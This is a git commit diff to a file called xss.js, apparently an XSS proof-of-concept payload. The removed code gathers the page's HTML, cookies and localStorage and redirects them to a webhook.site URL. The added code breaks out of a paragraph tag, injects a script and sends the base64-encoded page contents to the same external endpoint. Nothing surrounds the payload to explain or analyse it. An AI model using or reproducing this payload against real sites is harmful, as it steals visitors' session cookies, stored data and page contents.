e7921e0914712d958e90bfe6eeace179d40da65d
abhinav-adobe <akalpathy@adobe.com>
2025-06-25 14:06:55 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,6 @@
+</p><script>
 setTimeout(() => {
-  const body = document.documentElement.innerHTML;
-  const cookies = document.cookie;
-  const ls = JSON.stringify(localStorage);
-
-  const combined = 'DOM=' + encodeURIComponent(body) + '&COOKIE=' + encodeURIComponent(cookies) + '&LS=' + encodeURIComponent(ls);
-
-  location.href = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?' + combined;
+  const dump = btoa(document.documentElement.innerHTML);
+  location = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?dump=' + dump;
 }, 500);
+</script><p>
